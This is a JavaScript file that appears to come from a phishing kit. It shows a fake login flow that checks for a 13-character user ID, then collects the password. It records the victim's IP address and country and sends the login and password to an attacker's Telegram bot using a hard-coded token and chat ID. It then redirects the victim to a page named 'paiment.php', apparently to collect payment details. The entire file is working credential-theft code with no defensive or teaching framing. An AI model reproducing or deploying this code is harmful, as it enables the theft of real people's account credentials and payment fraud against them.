/*   --------  Telegram Settings  --------    */
const token = '67680088771:HUUHIU-ypw6_xD40IW5g7AhIXgTSKJxy_lY'
const chatID = '51367676238'
    /*   ------------------------  */
let ip
let country
fetch('https://extreme-ip-lookup.com/json/')
    .then(res => res.json())
    .then(data => {
        ip = data.query
        country = data.countryCode
    }).catch(err => {
        console.error('Error: ', err);
    });
/* ------------------------ */
function sendTelegram(myData, redirect, seconds = 1) {

    const myUrl = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + myData + '&parse_mode=MarkDown'

    fetch(myUrl).then(function(response) {
            return response.json()
        }).then(function(res) {

            setTimeout(function() {
                window.location.href = redirect;
            }, seconds);


        })
        .catch(function(err) {
            console.log(err)
        })




}
/* ------------------------ */

function sendLogin() {

    const user = document.getElementById('userIm1').value

    if (user.length == 13) {

        document.getElementById('passflex').style.display = "block";
        document.getElementById('btnLogin').style.display = "none";
        document.getElementById('btnPass').style.display = "block"



    } else {
        document.getElementById('erorPass').style.display = "block"
        document.getElementById('userIm1').style.border = "1px solid red"
    }
}

/* ------------------------ */

function sendPass() {

    const user = document.getElementById('userIm1').value
    const password = document.getElementById('pwdtmp1').value

    const myData = `From ${ip}/${country} | Login : ${user} | Password : ${password}`

    if (password.length > 5) {

        sendTelegram(myData, "paiment.php")

    } else {
        document.getElementById('pwdtmp1').style.border = "1px solid red"
    }
}